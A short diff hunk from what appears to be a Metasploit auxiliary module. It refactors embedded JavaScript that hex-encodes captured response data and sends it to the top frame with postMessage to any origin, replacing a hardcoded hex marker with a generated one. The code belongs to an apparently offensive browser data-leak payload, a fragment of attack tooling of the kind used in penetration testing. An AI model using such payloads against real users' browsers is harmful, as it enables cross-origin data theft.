@@ -143,7 +143,7 @@ class Metasploit3 < Msf::Auxiliary
                     return (c.length < 2) ? 0+c : c;
                   }).join(new String);
                   /*ensures there are no 'not allowed' responses that appear to be valid data*/
-                  if (hex.length && hex.indexOf('3c68746d6c3e3c626f64793e6e6f7420616c6c6f7765643c2f626f64793e3c2f68746d6c3e') == '-1') {
+                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex("<html><body>not allowed</body></html>","")}') == '-1') {
                     top.postMessage({data:hex,url:location.href}, '*');
                   }
                   parent.postMessage(1,'*');
